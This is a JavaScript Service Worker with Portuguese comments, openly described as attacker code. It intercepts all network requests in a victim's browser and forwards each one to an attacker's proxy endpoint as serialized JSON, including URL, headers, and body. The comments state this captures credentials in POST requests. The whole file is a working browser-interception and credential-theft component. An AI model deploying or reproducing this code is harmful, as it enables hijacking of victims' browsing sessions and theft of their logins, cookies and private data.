// Registra um listener para o evento "fetch", interceptando TODAS as requisições
// de rede feitas pelo navegador enquanto o Service Worker estiver ativo.
self.addEventListener("fetch", (event) => {
    // Delega o tratamento da requisição para a função handleRequest,
    // substituindo a resposta original pela resposta retornada pela função.
    event.respondWith(handleRequest(event.request));
});

// Função assíncrona que redireciona cada requisição capturada para o servidor proxy do atacante.
async function handleRequest(request) {
    // Monta a URL do endpoint proxy no servidor do atacante usando o mesmo origin do Service Worker.
    // O caminho "/lNv1pC9AWPUY4gbidyBO" é o endpoint receptor no proxy_server.js.
    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;

    try {
        // Serializa todos os dados relevantes da requisição original da vítima em um objeto JSON:
        // url, método HTTP, cabeçalhos, corpo, referrer e modo da requisição.
        const proxyRequest = {
            url: request.url,                                              // URL original que a vítima tentou acessar
            method: request.method,                                        // Método HTTP (GET, POST, etc.)
            headers: Object.fromEntries(request.headers.entries()),        // Todos os cabeçalhos HTTP convertidos em objeto
            body: await request.text(),                                    // Corpo da requisição (captura credenciais em POST)
            referrer: request.referrer,                                    // URL referenciadora da requisição
            mode: request.mode                                             // Modo CORS da requisição
        };

        // Reenvia a requisição capturada para o servidor proxy do atacante via POST com JSON.
        // "redirect: manual" impede que o SW siga redirecionamentos automaticamente.
        // "mode: same-origin" garante que a requisição ao proxy seja tratada como same-origin.
        return fetch(proxyRequestURL, {
            method: "POST",                           // Envia sempre como POST para o endpoint do proxy
            headers: {
                "Content-Type": "application/json",  // Informa ao proxy que o corpo é JSON
            },
            body: JSON.stringify(proxyRequest),       // Serializa o objeto completo da requisição original
            redirect: "manual",                       // Não segue redirecionamentos automaticamente (permite capturá-los)
            mode: "same-origin"                       // Restringe a requisição ao mesmo origin do SW
        });
    }
    catch (error) {
        // Registra no console qualquer falha ao encaminhar a requisição ao proxy.
        console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
    }
}
